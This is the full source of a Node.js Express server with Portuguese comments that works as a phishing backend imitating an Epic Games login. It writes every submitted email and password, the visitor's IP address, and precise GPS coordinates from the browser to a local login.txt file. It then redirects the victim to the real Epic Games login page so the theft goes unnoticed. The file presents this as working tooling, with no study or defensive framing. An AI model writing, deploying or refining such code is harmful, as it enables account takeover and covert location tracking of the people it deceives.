const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); 

const logPath = path.join(__dirname, 'login.txt');
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota de Localização (GPS Real)
app.post('/location', (req, res) => {
    const { lat, lon, acc } = req.body;
    const infoLoc = `[📍 GPS REAL] Lat: ${lat} | Lon: ${lon} | Precisão: ${acc}m | Data: ${new Date().toLocaleString('pt-BR')}\n`;

    fs.appendFile(logPath, infoLoc, (err) => {
        if (!err) console.log("📍 GPS capturado e salvo.");
    });
    res.sendStatus(204);
});

// Rota de Login + Captura de IP (Plano B)
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    // Captura o IP do usuário no Render
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const dados = `[🔑 LOGIN] E-mail: ${email} | Senha: ${password} | IP: ${ip} | Data: ${new Date().toLocaleString('pt-BR')}\n`;

    fs.appendFile(logPath, dados, (err) => {
        if (err) console.error("Erro ao salvar:", err);
        else console.log(`🔑 Login e IP (${ip}) capturados.`);
    });

    res.redirect('https://www.epicgames.com/id/login');
});

const PORT = process.env.PORT || 10000; // Porta padrão do Render
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
});